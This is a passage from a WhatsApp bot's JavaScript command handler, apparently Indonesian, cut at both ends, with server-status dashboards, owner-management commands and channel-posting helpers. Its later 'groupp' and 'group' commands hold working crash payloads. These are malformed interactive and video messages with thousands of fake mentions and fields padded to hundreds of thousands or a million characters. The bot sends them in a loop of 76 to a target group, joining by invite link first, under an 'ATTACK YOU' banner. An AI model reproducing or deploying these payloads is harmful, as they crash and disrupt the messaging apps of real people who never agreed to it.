            ctx.fillStyle = THEME.textTertiary; ctx.font = "10px Arial"; ctx.textAlign = "center"; ctx.fillText(stats.cpuModel.substring(0, 32), x1 + cardW / 2, mainY + 215);

            drawCard(ctx, x2, mainY, cardW, cardH, 15);
            drawIcon(ctx, x2 + 30, mainY + 35, 'memory', THEME.success);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 18px Arial"; ctx.textAlign = "left"; ctx.fillText("MEMORY", x2 + 55, mainY + 40);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.fillText(`Total: ${formatSize(stats.ramTotal)}`, x2 + 55, mainY + 58);
            const ramPercent = (stats.ramUsed / stats.ramTotal) * 100;
            drawDonutChart(ctx, x2 + cardW / 2, mainY + 140, 50, 12, ramPercent, THEME.success);
            ctx.fillStyle = THEME.textTertiary; ctx.font = "11px Arial"; ctx.textAlign = "center"; ctx.fillText(`${formatSize(stats.ramUsed)} Used`, x2 + cardW / 2, mainY + 205); ctx.fillText(`${formatSize(stats.ramTotal - stats.ramUsed)} Free`, x2 + cardW / 2, mainY + 220);
 
            drawCard(ctx, x3, mainY, cardW, cardH, 15);
            drawIcon(ctx, x3 + 30, mainY + 35, 'disk', THEME.purple);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 18px Arial"; ctx.textAlign = "left"; ctx.fillText("STORAGE", x3 + 55, mainY + 40);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.fillText(`Total: ${formatSize(stats.diskTotal)}`, x3 + 55, mainY + 58);
            let diskPercent = stats.diskTotal > 0 ? (stats.diskUsed / stats.diskTotal) * 100 : 0;
            drawDonutChart(ctx, x3 + cardW / 2, mainY + 140, 50, 12, diskPercent, THEME.purple);
            ctx.fillStyle = THEME.textTertiary; ctx.font = "11px Arial"; ctx.textAlign = "center"; ctx.fillText(`${formatSize(stats.diskUsed)} Used`, x3 + cardW / 2, mainY + 205); ctx.fillText(`${formatSize(stats.diskTotal - stats.diskUsed)} Free`, x3 + cardW / 2, mainY + 220);

            drawCard(ctx, x4, mainY, cardW, cardH, 15);
            drawIcon(ctx, x4 + 30, mainY + 35, 'network', THEME.cyan);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 18px Arial"; ctx.textAlign = "left"; ctx.fillText("NETWORK", x4 + 55, mainY + 40);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.fillText(`Interface: ${stats.networkInterface}`, x4 + 55, mainY + 58);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 13px Arial"; ctx.textAlign = "left"; ctx.fillText("RX (Download)", x4 + 30, mainY + 95);
            ctx.fillStyle = THEME.cyan; ctx.font = "bold 20px Arial"; ctx.fillText(formatSize(stats.networkRx), x4 + 30, mainY + 120);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 13px Arial"; ctx.fillText("TX (Upload)", x4 + 30, mainY + 155);
            ctx.fillStyle = THEME.pink; ctx.font = "bold 20px Arial"; ctx.fillText(formatSize(stats.networkTx), x4 + 30, mainY + 180);

            const statsY = 400, statW = 175, statH = 70, statGap = 20;
            drawStatBox(ctx, 50, statsY, statW, statH, "HOSTNAME", stats.hostname.substring(0, 15), THEME.primary, 'server');
            drawStatBox(ctx, 50 + (statW + statGap), statsY, statW, statH, "PLATFORM", `${stats.platform} (${stats.arch})`, THEME.success, 'server');
            drawStatBox(ctx, 50 + (statW + statGap) * 2, statsY, statW, statH, "BOT UPTIME", stats.uptimeBot, THEME.purple, 'clock');
            drawStatBox(ctx, 50 + (statW + statGap) * 3, statsY, statW, statH, "SERVER UPTIME", stats.uptimeServer, THEME.warning, 'clock');
            drawStatBox(ctx, 50 + (statW + statGap) * 4, statsY, statW, statH, "NODE.JS", stats.nodeVersion, THEME.cyan, 'server');

            const perfY = 500, perfH = 250, perfW = W - 100;
            drawCard(ctx, 50, perfY, perfW, perfH, 15);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 20px Arial"; ctx.textAlign = "left"; ctx.fillText("SYSTEM PERFORMANCE", 75, perfY + 35);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "12px Arial"; ctx.fillText("Real-time resource monitoring", 75, perfY + 55);

            const barY = perfY + 85, barW = 500, barH = 18, barGap = 35;
            drawProgressBar(ctx, 75, barY, barW, barH, stats.cpuLoad, THEME.primary, "CPU Load", `${stats.cpuLoad}%`);
            drawProgressBar(ctx, 75, barY + barGap, barW, barH, ramPercent, THEME.success, "Memory Usage", `${Math.round(ramPercent)}%`);
            drawProgressBar(ctx, 75, barY + barGap * 2, barW, barH, diskPercent, THEME.purple, "Disk Usage", `${Math.round(diskPercent)}%`);
            drawProgressBar(ctx, 75, barY + barGap * 3, barW, barH, Math.min(100, (stats.ping / 500) * 100), pingStatus, "Network Latency", `${stats.ping}ms`);

            const infoX = 620, infoStartY = perfY + 85, infoLineHeight = 28;
            let infoY = infoStartY;
            ctx.font = "13px Arial"; ctx.textAlign = "left";
            const drawInfoLine = (label, value) => {
                ctx.fillStyle = THEME.textSecondary; ctx.fillText(label, infoX, infoY);
                ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 13px Arial"; ctx.fillText(value, infoX + 150, infoY);
                ctx.font = "13px Arial"; infoY += infoLineHeight;
            };
            drawInfoLine("OS Release", stats.release);
            drawInfoLine("CPU Cores", `${stats.cpuCores} Cores`);
            drawInfoLine("CPU Speed", `${stats.cpuSpeed} MHz`);
            drawInfoLine("Total Memory", formatSize(stats.ramTotal));
            drawInfoLine("Free Memory", formatSize(stats.ramTotal - stats.ramUsed));
            ctx.fillStyle = THEME.textTertiary; ctx.font = "10px Arial"; ctx.textAlign = "center"; ctx.fillText(`Dashboard Generated: ${new Date().toLocaleString()}`, W / 2, H - 20);
            return canvas.toBuffer('image/png');
        }

        function getNetworkStats() {
            try {
                const interfaces = os.networkInterfaces();
                let totalRx = 0, totalTx = 0, activeInterface = 'N/A', ip = 'N/A';
                for (const [name, addrs] of Object.entries(interfaces)) {
                    if (name.toLowerCase().includes('lo')) continue;
                    for (const addr of addrs) {
                        if (addr.family === 'IPv4' && !addr.internal) { activeInterface = name; ip = addr.address; break; }
                    }
                }
                try {
                    const netstat = execSync("cat /proc/net/dev 2>/dev/null || echo ''").toString();
                    const lines = netstat.split('\n');
                    for (const line of lines) {
                        if (line.includes(':') && !line.includes('lo:')) {
                            const parts = line.trim().split(/\s+/);
                            if (parts.length >= 10) { totalRx += parseInt(parts[1]) || 0; totalTx += parseInt(parts[9]) || 0; }
                        }
                    }
                } catch (e) {}
                return { totalRx, totalTx, activeInterface, ip };
            } catch (e) {
                return { totalRx: 0, totalTx: 0, activeInterface: 'N/A', ip: 'N/A' };
            }
        }

        const start = performance.now();
        await new Promise(resolve => setTimeout(resolve, 10));
        const end = performance.now();
        const latency = (end - start).toFixed(2);

        const cpus = os.cpus();
        const totalMem = os.totalmem();
        const freeMem = os.freemem();
        const loadAvg = os.loadavg();
        const cpuPercent = Math.min(100, (loadAvg[0] * 100) / cpus.length).toFixed(1);

        let diskTotal = 0, diskUsed = 0;
        try {
            const df = execSync("df -k --output=size,used / 2>/dev/null").toString();
            const lines = df.trim().split("\n");
            if (lines.length > 1) {
                const [total, used] = lines[1].trim().split(/\s+/).map(Number);
                diskTotal = total * 1024;
                diskUsed = used * 1024;
            }
        } catch (e) {}

        const networkStats = getNetworkStats();

        const stats = {
            ping: latency,
            hostname: os.hostname(),
            platform: os.platform(),
            arch: os.arch(),
            release: os.release(),
            nodeVersion: process.version,
            uptimeBot: formatTime(process.uptime()),
            uptimeServer: formatTime(os.uptime()),
            cpuModel: cpus[0].model.trim(),
            cpuSpeed: cpus[0].speed,
            cpuCores: cpus.length,
            cpuLoad: cpuPercent,
            ramTotal: totalMem,
            ramUsed: totalMem - freeMem,
            diskTotal: diskTotal,
            diskUsed: diskUsed,
            networkRx: networkStats.totalRx,
            networkTx: networkStats.totalTx,
            networkInterface: networkStats.activeInterface,
            networkIP: networkStats.ip
        };

        const imageBuffer = await renderDashboard(stats);

        await Putzz.sendMessage(m.chat, {
            image: imageBuffer,
            caption: `*SERVER - INFORMATION 🔴*\n\n` +
                `- Latency: ${latency}ms\n` +
                `- CPU: ${stats.cpuLoad}%\n` +
                `- RAM: ${formatSize(stats.ramUsed)} / ${formatSize(stats.ramTotal)}\n` +
                `- Disk: ${formatSize(stats.diskUsed)} / ${formatSize(stats.diskTotal)}\n` +
                `- Network: ↓${formatSize(stats.networkRx)} ↑${formatSize(stats.networkTx)}`
        }, {
            quoted: m
        });

    } catch (e) {
        console.error(e);
        ReplyLanz(`Error: ${e.message}`);
    }
}
break;
case "ping2":
case "uptime2": {
    const start = performance.now()
    const tot = await nou.drive.info()

    const cpus = os.cpus()
    const totalmem = os.totalmem()
    const freemem = os.freemem()
    const usedmem = totalmem - freemem

    const ramPercent = Math.floor((usedmem / totalmem) * 100)
    const diskPercent = Math.floor((tot.usedGb / tot.totalGb) * 100)
    const cpuPercent = Math.floor(os.loadavg()[0] * 100)
    const latency = Math.floor(performance.now() - start)

    // ===== progress bar =====
    function bar(p) {
        const full = Math.floor(p / 10)
        const empty = 10 - full
        return "█".repeat(full) + "░".repeat(empty)
    }

    const content = {
      pollResultSnapshotMessage: {
        pollVotes: [
          {
            optionName:
`OS        : ${os.type()} ${os.release()}
CPU       : ${cpus[0].model}
Clock     : ${cpus[0].speed} MHz
Cores     : ${cpus.length}
RAM       : ${formatp(usedmem)} / ${formatp(totalmem)}
Disk      : ${tot.usedGb} GB / ${tot.totalGb} GB
Uptime    : ${runtime(os.uptime())}`,
            optionVoteCount: 1
          },
          {
            optionName: `Latency (ms)\n${bar(latency)} ${latency}`,
            optionVoteCount: latency
          },
          {
            optionName: `RAM Used (%)\n${bar(ramPercent)} ${ramPercent}`,
            optionVoteCount: ramPercent
          },
          {
            optionName: `Disk Used (%)\n${bar(diskPercent)} ${diskPercent}`,
            optionVoteCount: diskPercent
          },
          {
            optionName: `CPU (%)\n${bar(cpuPercent > 100 ? 100 : cpuPercent)} ${cpuPercent}`,
            optionVoteCount: cpuPercent
          }
        ],
        name: "SERVER STATS",
        contextInfo: {
      forwardingScore: 127,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363404782325678@newsletter",
        serverMessageId: 0,
        newsletterName: "LanzOffcial"
      },
      forwardOrigin: 0
    },
        pollType: 0
      }
    }

    await Putzz.relayMessage(m.chat, content, {})
}
break;

case "fb":
case "uptimfve": {
    let timestamp = performance.now();
    let latensi = performance.now() - timestamp; 
    let tot = await nou.drive.info();
    let freemem = os.freemem();
    let usedmem = os.totalmem() - freemem;
    let cpus = os.cpus();
    let loadavg = os.loadavg()[0].toFixed(2);
    let vpsRelease = os.release();
    let vpsArch = os.arch();
    let osVersion = os.version ? os.version() : "Tidak diketahui";
    let cpuModel = cpus[0].model;
    let cpuSpeed = cpus[0].speed;
    let uptimeVPS = runtime(os.uptime());
    let hostnameServer = os.hostname();

    let respon = `⟣━━━━━━━━━━━━━━━━━⟢
🌐 *INFORMASI VPS* 🌐
⟣━━━━━━━━━━━━━━━━━⟢
🖥️ *Sistem Operasi :* ${os.type()} ${osVersion}
🛠️ *Kernel Version :* ${vpsRelease}
🏗️ *Arsitektur :* ${vpsArch}
🚀 *Jenis VPS :* Digital Ocean (Cloud Server)
⚡ *Total CPU :* ${cpus.length} Core
🔧 *CPU Model :* ${cpuModel}
⚙️ *CPU Speed :* ${cpuSpeed} MHz
⏳ *Uptime VPS :* ${uptimeVPS}
⟣━━━━━━━━━━━━━━━━━⟢

⟣━━━━━━━━━━━━━━━━━⟢
🖥️ *INFORMASI SERVER* 🖥️
⟣━━━━━━━━━━━━━━━━━⟢
🏷️ *UUID Server :* ${hostnameServer}
💾 *Total RAM :* ${formatp(os.totalmem())}
📊 *RAM Terpakai :* ${formatp(usedmem)}
🟢 *RAM Tersedia :* ${formatp(freemem)}
📀 *Total Disk :* ${tot.totalGb} GB
📊 *Disk Terpakai :* ${tot.usedGb} GB
⚙️ *CPU Load :* ${loadavg}%
⏳ *Uptime Server :* ${uptimeVPS}
⟣━━━━━━━━━━━━━━━━━⟢

⟣━━━━━━━━━━━━━━━━━⟢
🤖 *INFORMASI BOT* 🤖
⟣━━━━━━━━━━━━━━━━━⟢
⚡ *Respon Speed :* ${latensi.toFixed(4)} detik
⏰ *Runtime Bot :* ${runtime(process.uptime())}
📌 *Versi Node.js :* ${process.version}
💾 *Memory Usage Bot :* ${formatp(process.memoryUsage().rss)}
🔧 *Platform :* ${process.platform}
⟣━━━━━━━━━━━━━━━━━⟢`;

    await ReplyLanz(respon);
}
break;

case "ping2": case "uptime2": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🔴 INFORMATION SERVER*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}

*🔵 INFORMATION Mikasa MD*

*• Respon Speed :* ${latensi.toFixed(4)} detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
await ReplyLanz(respon)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "public":
case "happy": {
if (!isCreator) return
Putzz.public = true
ReplyLanz("Berhasil mengganti ke mode *happy*")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "restart": case "rst": {
if (!isCreator) return ReplyLanz(mess.owner)
await loadres();
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "upchannel": case "upch": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) return ReplyLanz(example("teksnya"))
await Putzz.sendMessage(idSaluran, {text: text})
ReplyLanz("Berhasil mengirim pesan *teks* ke dalam channel whatsapp")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "uptoch": {

if (!isOwner) return ReplyLanz("Only owner")

if (!text) return ReplyLanz(example("teksnya dengan mengirim foto"))

if (!m.quoted)
   return ReplyLanz("Reply foto / video")

const q = m.quoted
const mime = (q.msg || q).mimetype || ""

if (!/image|video/.test(mime))
   return ReplyLanz("Reply foto / video")


await ReplyLanz("⏳ Upload ke channel...")

const buffer = await Putzz.downloadAndSaveMediaMessage(q)


   // ===== NO COMPRESS (DOCUMENT) =====
   await Putzz.sendMessage(idSaluran, {video: await fs.readFileSync(buffer), caption: text})
await fs.unlinkSync(buffer)
reaksi('✅');
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "getsc": {
if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber) return ReplyLanz(mess.owner)
let dir = await fs.readdirSync("./library/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./library/database/sampah/${i}`)
}}
await ReplyLanz("Memproses backup script bot")
var name = `Simple-Bot-by-yassxofc`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await Putzz.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return ReplyLanz("Script bot berhasil dikirim ke private chat")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetdb": case "rstdb": {
if (!isCreator) return ReplyLanz(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
ReplyLanz("Berhasil mereset database ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'setpp':
case 'setpppanjang': {
const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || q.mediaType || ''
	if (/image/g.test(mime) && !/webp/g.test(mime)) {
		try {
			const media = await Putzz.downloadAndSaveMediaMessage(quoted)
			let botNumber = await Putzz.decodeJid(Putzz.user.id)
			let { img } = await pepe(media)
			await Putzz.query({
				tag: 'iq',
				attrs: {
					to: botNumber,
					type:'set',
					xmlns: 'w:profile:picture'
				},
				content: [
					{
						tag: 'picture',
						attrs: { type: 'image' },
						content: img
					}
				]
			})
			ReplyLanz(`Sukses mengganti PP Bot`)
		} catch (e) {
			console.log(e)
			ReplyLanz(`Terjadi kesalahan, coba lagi nanti.`)
		}
	} else {
		ReplyLanz(`Kirim gambar dengan caption *${command}* atau tag gambar yang sudah dikirim`)
	}
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "clearchat": case "clc": {
if (!isCreator) return ReplyLanz(mess.owner)
Putzz.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listowner": case "listown": {
if (owners.length < 1) return ReplyLanz("Tidak ada owner tambahan")
let teks = `\n *乂 List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Putzz.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'spoiler':
            case 'hidetext':
            case 'readmore':
            case 'selengkapnya': {
                const more = String.fromCharCode(8206);
                const readMore = more.repeat(4001);
                let [l, r] = text.split('|');
                if (!l) l = '';
                if (!r) r = '';
                await Putzz.sendMessage(m.chat, {
                    text: l + readMore + r
                }, {
                    quoted: Asuma
                });
            }
            break

case "delowner": case "delown": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!m.quoted && !text) return ReplyLanz(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return ReplyLanz(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return ReplyLanz(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
ReplyLanz(`Berhasil menghapus owner ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addowner2": case "addown2": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!m.quoted && !text) return ReplyLanz(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return ReplyLanz(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
ReplyLanz(`Berhasil menambah owner ✅`)
}
break
case "groupp": {
async function gsIntjavgb(Putzz, target, otaxkiw = true) {

    let otaxi = {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, (_, i) => `628${i + 72}@s.whatsapp.net`),
          isForwarded: true,
          forwardingScore: 7205,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "12037205250208@newsletter",
            newsletterName: "do u know me? | Information",
            serverMessageId: 1000,
            accessibilityText: "❖ 𝙁𝙪𝙘𝙠 𝙐 𝙈𝙚𝙣"
          },
          statusAttributionType: "RESHARED_FROM_MENTION",
          contactVcard: true,
          isSampled: true,
          dissapearingMode: {
            initiator: target,
            initiatedByMe: true
          },
          expiration: Date.now()
        },
        body: {
          text: "❖ 𝙄𝙢 𝙃𝙚𝙧𝙚 𝙊𝙏𝘼𝙓",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "call_permission_request",
          paramsJson: "\x10".repeat(1000000),
          version: 3
        }
      }
    }

    let msg = generateWAMessageFromContent(
      target,
      { groupStatusMessageV2: { message: otaxi } },
      {}
    )

    await Putzz.relayMessage(
      target,
      msg.message,
      otaxkiw
        ? { messageId: msg.key.id, userJid: target }
        : { messageId: msg.key.id }
    )

    await sleep(1000)

    await Putzz.sendMessage(target, {
      delete: {
        remoteJid: target,
        fromMe: true,
        id: msg.key.id,
      }
  })
}


if (!isOwner) return ReplyLanz("Only owner")
if (!text) return ReplyLanz('masukan id grub')
const delay = ms => new Promise(res => setTimeout(res, ms))


//await ReplyLanz("⏳ Sedang join grup, tunggu bentar...")

const target = `${text}`
const isTarget = text
//await ReplyLanz("(֍) Berhasil join grup! Kirim bug sekarang...")

// ===== kirim animasi =====
await Putzz.sendMessage(m.chat,{
   video:{ url:"https://files.catbox.moe/k797ct.mp4" },
   gifPlayback: true, 
   caption:`
✘ 𝙻𝙰𝙽𝚉 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ TARGET : ${target}
`
},{ quoted:m })

// ===== TEMPAT FUNCTION =====
for (let i = 0; i <= 75; i++) {
    await gsIntjavgb(Putzz, target, otaxkiw = true)
    await delay(1000)
}

// ===== FINISH =====
await Putzz.sendMessage(m.chat,{
   video:{ url:"https://files.catbox.moe/k797ct.mp4" },
   gifPlayback: true, 
   text:`
✘ 𝙻𝙰𝙽𝚉 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ TARGET : ${target}
♛ TIME : ${new Date().toLocaleString()}
✔ SUCCESS
`
})
await reaksi("✅");
}
break
async function FVWa(Putzz, target) {
  await Putzz.relayMessage(target, {
    "videoMessage": {
      "url": "https://mmg.whatsapp.net/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&mms3=true",
      "mimetype": "video/mp4",
      "fileSha256": "Vbqeh2lor8Jw03cFXxKlG0Z8ov9a8WOEkviuZSVSn6A=",
      "fileLength": "175891",
      "seconds": 1,
      "mediaKey": "W430WGQWHdPJavPx++FhjoimbRmgn4juKdt9R6yBKOM=",
      "height": 848,
      "width": 480,
      "fileEncSha256": "9QJErKyUw6Um/LC9shgLoZmN0UDoX8DJPob/G0oXi48=",
      "directPath": "/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&_nc_hot=1765345956",
      "mediaKeyTimestamp": "1765345955",
      "streamingSidecar": "As5LhkSwskInV2ZBolPQK8kUK/FS8OjeKC4E/DSY",
      "annotations": [{
        "shouldSkipConfirmation": true,
        "embeddedContent": {
          "embeddedMusic": {
            "musicContentMediaId": "3312808138872179",
            "songId": "270259430421407",
            "author": "ြ".repeat(200000),

            "title": "꙳͙͡༑ᐧ̤⿻⌜𝑲͢𝒚ͯ𝐳ͮ 𖣂 𝑪͢𝒓ͯ𝒂͡𝒔͢𝒉ͮ⌟⿻",
            "artworkDirectPath": "/v/t62.76458-24/595759391_863062182901487_831028644482797415_n.enc?ccb=11-4&oh=01_Q5Aa3QFi_Lrr3pnfhgCNgS6DwjBC9W1jxZqyMu9YTA3qbjUHrg&oe=69606F3E&_nc_sid=5e03e0",
            "artworkSha256": "Rm0L8d3YCRSi2JNPUdFEM3n1eABvF1mdvE0DWnPSzyQ=",
            "artworkEncSha256": "Q6uE0wu/wQ4goKG+OHQkTvSJ2dcSzALDzZ322g9xdfQ=",
            "artistAttribution": "https://www.instagram.com/_u/carlos_10474",
            "countryBlocklist": "",
            "isExplicit": true,
            "artworkMediaKey": "1hxqLYZLT2dZnJayfE4KP/9wh+kSbBVBkvvguo+N8m8=",
            "musicSongStartTimeInMs": "10149",
            "derivedContentStartTimeInMs": "0",
            "overlapDurationInMs": "1000"
          }
        },
        "embeddedAction": true
      }]
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
  });
}
case "group": {
async function gsIntjavgb(Putzz, target, otaxkiw = true) {

    let otaxi = {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, (_, i) => `628${i + 72}@s.whatsapp.net`),
          isForwarded: true,
          forwardingScore: 7205,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "12037205250208@newsletter",
            newsletterName: "do u know me? | Information",
            serverMessageId: 1000,
            accessibilityText: "❖ 𝙁𝙪𝙘𝙠 𝙐 𝙈𝙚𝙣"
          },
          statusAttributionType: "RESHARED_FROM_MENTION",
          contactVcard: true,
          isSampled: true,
          dissapearingMode: {
            initiator: target,
            initiatedByMe: true
          },
          expiration: Date.now()
        },
        body: {
          text: "❖ 𝙄𝙢 𝙃𝙚𝙧𝙚 𝙊𝙏𝘼𝙓",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "call_permission_request",
          paramsJson: "\x10".repeat(1000000),
          version: 3
        }
      }
    }

    let msg = generateWAMessageFromContent(
      target,
      { groupStatusMessageV2: { message: otaxi } },
      {}
    )
    await sleep(2000)
    await Putzz.relayMessage(
      target,
      msg.message,
      otaxkiw
        ? { messageId: msg.key.id, userJid: target }
        : { messageId: msg.key.id }
    )

    await sleep(1000)

    await Putzz.sendMessage(target, {
      delete: {
        remoteJid: target,
        fromMe: true,
        id: msg.key.id,
      }
    })
  }


async function FVWa(Putzz, target) {
  await Putzz.relayMessage(target, {
    "videoMessage": {
      "url": "https://mmg.whatsapp.net/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&mms3=true",
      "mimetype": "video/mp4",
      "fileSha256": "Vbqeh2lor8Jw03cFXxKlG0Z8ov9a8WOEkviuZSVSn6A=",
      "fileLength": "175891",
      "seconds": 1,
      "mediaKey": "W430WGQWHdPJavPx++FhjoimbRmgn4juKdt9R6yBKOM=",
      "height": 848,
      "width": 480,
      "fileEncSha256": "9QJErKyUw6Um/LC9shgLoZmN0UDoX8DJPob/G0oXi48=",
      "directPath": "/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&_nc_hot=1765345956",
      "mediaKeyTimestamp": "1765345955",
      "streamingSidecar": "As5LhkSwskInV2ZBolPQK8kUK/FS8OjeKC4E/DSY",
      "annotations": [{
        "shouldSkipConfirmation": true,
        "embeddedContent": {
          "embeddedMusic": {
            "musicContentMediaId": "3312808138872179",
            "songId": "270259430421407",
            "author": "ြ".repeat(200000),

            "title": "꙳͙͡༑ᐧ̤⿻⌜𝑲͢𝒚ͯ𝐳ͮ 𖣂 𝑪͢𝒓ͯ𝒂͡𝒔͢𝒉ͮ⌟⿻",
            "artworkDirectPath": "/v/t62.76458-24/595759391_863062182901487_831028644482797415_n.enc?ccb=11-4&oh=01_Q5Aa3QFi_Lrr3pnfhgCNgS6DwjBC9W1jxZqyMu9YTA3qbjUHrg&oe=69606F3E&_nc_sid=5e03e0",
            "artworkSha256": "Rm0L8d3YCRSi2JNPUdFEM3n1eABvF1mdvE0DWnPSzyQ=",
            "artworkEncSha256": "Q6uE0wu/wQ4goKG+OHQkTvSJ2dcSzALDzZ322g9xdfQ=",
            "artistAttribution": "https://www.instagram.com/_u/carlos_10474",
            "countryBlocklist": "",
            "isExplicit": true,
            "artworkMediaKey": "1hxqLYZLT2dZnJayfE4KP/9wh+kSbBVBkvvguo+N8m8=",
            "musicSongStartTimeInMs": "10149",
            "derivedContentStartTimeInMs": "0",
            "overlapDurationInMs": "1000"
          }
        },
        "embeddedAction": true
      }]
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
  });
}
if (!isOwner) return ReplyLanz("Only owner")

const delay = ms => new Promise(res => setTimeout(res, ms))

if (!text)
   return ReplyLanz(
"🚫 Masukin link grup!\nContoh:\n.group https://chat.whatsapp.com/xxxx"
   )

const groupLink = text.trim()

const codeMatch =
   groupLink.match(/^https:\/\/chat\.whatsapp\.com\/([A-Za-z0-9]+)/)

if (!codeMatch)
   return ReplyLanz("🚫 Link grup salah!")

const groupCode = codeMatch[1]

await ReplyLanz("⏳ Sedang join grup, tunggu bentar...")

let groupJid

try {
   groupJid = await Putzz.groupAcceptInvite(groupCode)
} catch (err) {
   return ReplyLanz("❌ Gagal join grup: " + err.message)
}
const target = groupJid
const isTarget = groupJid
await ReplyLanz("(֍) Berhasil join grup! Kirim bug sekarang...")

// ===== kirim animasi =====
const sent = await Putzz.sendMessage(m.chat,{
   video:{ url:"https://files.catbox.moe/k797ct.mp4" },
